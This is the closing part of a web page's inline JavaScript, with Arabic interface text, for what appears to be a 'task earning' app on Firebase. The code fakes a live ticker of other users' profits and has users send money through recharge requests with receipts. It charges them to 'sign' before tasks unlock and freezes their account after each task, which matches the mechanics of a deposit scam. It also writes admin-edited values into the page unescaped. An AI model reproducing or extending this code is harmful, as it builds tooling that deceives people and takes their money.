        function updateAppUI() { if(currentUser.isBanned){alert("محظور");location.reload();return;} document.getElementById('home-user-name').innerText=currentUser.name; document.getElementById('profile-name').innerText=currentUser.name; document.getElementById('profile-balance').innerText=currentUser.balance.toFixed(2); updateWorkPage(); }
        window.copyToClipboard = () => { navigator.clipboard.writeText(document.getElementById('recharge-admin-number').innerText); alert("تم النسخ"); };
        function startFakeTicker() { setInterval(()=>{ const c=document.getElementById('fake-profit-ticker'); if(c){ const d=document.createElement('div'); d.className='text-[10px] text-gray-500 flex justify-between px-2 mb-1'; d.innerHTML=`<span>01xxxx${Math.floor(Math.random()*1000)}</span><span class="text-green-600">+${Math.floor(Math.random()*50)*100}</span>`; c.prepend(d); if(c.children.length>3) c.lastChild.remove(); } },2500); }
        function startImageSlider() { setInterval(()=>{ const s=document.querySelectorAll('.slider-container .slide'); if(s.length){ let a=document.querySelector('.slide.active'); a.classList.remove('active'); (a.nextElementSibling||s[0]).classList.add('active'); } },3000); }
        window.handleFileSelect = (e) => { const f=e.target.files[0]; if(f){ selectedFile=f; const r=new FileReader(); r.onload=(e)=>{document.getElementById('upload-preview').src=e.target.result; document.getElementById('upload-preview').classList.remove('hidden'); document.getElementById('upload-icon').classList.add('hidden'); document.getElementById('upload-text').innerText="تم الاختيار";} ; r.readAsDataURL(f); } }
        window.submitRechargeRequest = () => { const a=document.getElementById('charge-amount').value, s=document.getElementById('charge-sender').value, n=document.getElementById('charge-name').value; if(!a||!s||!n||!selectedFile) return alert("ناقص"); window.push(window.ref(window.db,'recharge_requests'), {userPhone:currentUser.phone||currentUser.email, senderName:n, amount:parseFloat(a), senderNumber:s, fileName:selectedFile.name, status:'pending', timestamp:Date.now()}).then(()=>{alert("تم"); closeRechargeModal();}); }
        window.openRechargeModal = () => document.getElementById('recharge-modal').classList.remove('hidden');
        window.closeRechargeModal = () => document.getElementById('recharge-modal').classList.add('hidden');
        window.switchTab = (id, el) => { ['home-page','signature-page','work-page','history-page','profile-page','support-page'].forEach(p => document.getElementById(p).classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); document.querySelectorAll('.nav-item').forEach(n => { n.classList.remove('active', 'text-black'); n.classList.add('text-gray-400'); }); if(el) { el.classList.add('active', 'text-black'); el.classList.remove('text-gray-400'); } }
        
        // Missing Signatures & Work logic
        function renderSignatures() { const c=document.getElementById('signature-list'); if(c) { c.innerHTML=''; signatures.forEach(s=>{ const b=s.img?`style="background-image:url('${s.img}');"`:''; c.innerHTML+=`<div class="bg-white p-4 rounded-xl shadow-md border flex flex-col gap-2 relative overflow-hidden" ${b}><div class="absolute inset-0 bg-white/90 z-0"></div><div class="relative z-10 flex justify-between"><h3 class="font-bold">${s.name}</h3><span class="bg-green-100 text-green-700 text-xs px-2 py-1 rounded">${s.price}</span></div><button onclick="signContract('${s.name}',${s.price})" class="relative z-10 w-full bg-black text-white py-2 rounded-lg text-sm mt-2">اشتراك</button></div>`; }); } }
        function renderAdminSignaturesUI() { const c=document.getElementById('admin-signatures-container'); c.innerHTML=''; signatures.forEach((s,i)=>{ c.innerHTML+=`<div class="bg-white border p-2 rounded flex gap-2 items-center"><input id="sn-${i}" value="${s.name}" class="border p-1 text-xs flex-1"><input id="sp-${i}" value="${s.price}" class="border p-1 text-xs w-20"><input id="si-${i}" value="${s.img||''}" class="border p-1 text-xs w-1/3"><button onclick="deleteSignature(${i})" class="text-red-500"><i class="fa-solid fa-trash"></i></button></div>`; }); }
        window.saveAdminSignatures = () => { let u=[]; const rows=document.getElementById('admin-signatures-container').children; for(let i=0; i<rows.length; i++) if(document.getElementById(`sn-${i}`)) u.push({name:document.getElementById(`sn-${i}`).value, price:parseFloat(document.getElementById(`sp-${i}`).value), img:document.getElementById(`si-${i}`).value}); window.set(window.ref(window.db,'signatures'), u).then(()=>alert("تم")); }
        window.addNewSignature = () => { signatures.push({name:"New", price:0}); renderAdminSignaturesUI(); }
        window.deleteSignature = (i) => { signatures.splice(i,1); renderAdminSignaturesUI(); }
        window.signContract = (n,p) => { if(currentUser.balance<p){alert("رصيد غير كافي");openRechargeModal();return;} if(confirm("خصم "+p+"؟")) { let k = (currentUser.email||currentUser.phone).replace(/[.#$[\]]/g,'_'); window.update(window.ref(window.db,`users/${k}`),{isSigned:true, balance:currentUser.balance-p}).then(()=>window.switchTab('work-page', document.getElementById('nav-work'))); } }
        function updateWorkPage() { if(!currentUser.isSigned){document.getElementById('sign-alert').classList.remove('hidden');document.getElementById('task-area').classList.add('opacity-50','blur-sm');return;} document.getElementById('sign-alert').classList.add('hidden'); document.getElementById('task-area').classList.remove('opacity-50','blur-sm'); if(currentUser.isTaskFrozen){document.getElementById('frozen-message').classList.remove('hidden');return;}else document.getElementById('frozen-message').classList.add('hidden'); const t=tasks[currentUser.currentTaskIndex-1]; if(!t) return; document.getElementById('task-name').innerText=t.name; document.getElementById('task-price').innerText=t.price; document.getElementById('task-img').src=t.img; document.getElementById('task-counter').innerText=`${currentUser.currentTaskIndex}/24`; document.getElementById('task-commission').innerText=t.commission; }
        window.processTask = () => { const t=tasks[currentUser.currentTaskIndex-1]; if(currentUser.balance<t.price){alert("رصيد غير كافي");openRechargeModal();return;} setTimeout(()=>{ let k=(currentUser.email||currentUser.phone).replace(/[.#$[\]]/g,'_'); window.update(window.ref(window.db,`users/${k}`),{balance:currentUser.balance+parseFloat(t.commission), isTaskFrozen:true}); },1500); }
        window.logout = () => location.reload();
    </script>
</body>
</html>
